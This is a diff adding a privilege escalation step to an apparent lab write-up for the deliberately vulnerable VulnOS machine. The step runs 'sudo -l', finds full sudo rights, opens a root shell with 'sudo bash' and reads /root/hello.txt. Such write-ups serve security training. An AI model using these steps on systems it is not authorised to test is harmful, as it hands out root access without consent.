@@ -409,10 +409,40 @@ wow, we got the shell here.
 
 ## 4.Privilege Escalation
 
+Just check for sudo permissions on the box for user vulnosadmin:
 
+```text
+vulnosadmin@VulnOS:~$ sudo -l
+[sudo] password for vulnosadmin:
+Matching Defaults entries for vulnosadmin on this host:
+    env_reset
 
+User vulnosadmin may run the following commands on this host:
+    (ALL) ALL
+```
 
+wow we can run every command here :
 
+```text
+vulnosadmin@VulnOS:~$ sudo bash
+
+root@VulnOS:~# id
+uid=0(root) gid=0(root) groepen=0(root)
+
+root@VulnOS:~# cd /root
+root@VulnOS:/root# ls
+hello.txt
+
+root@VulnOS:/root# cat hello.txt
+Hello,
+
+So you got root... You still need to find the rest of the vulnerabilities inside the OS !
+
+TRY HARDER !!!!!!!
+root@VulnOS:/root#
+```
+
+This is how we can get root on this machine, but there are still other ways to do this :)
 
 
 
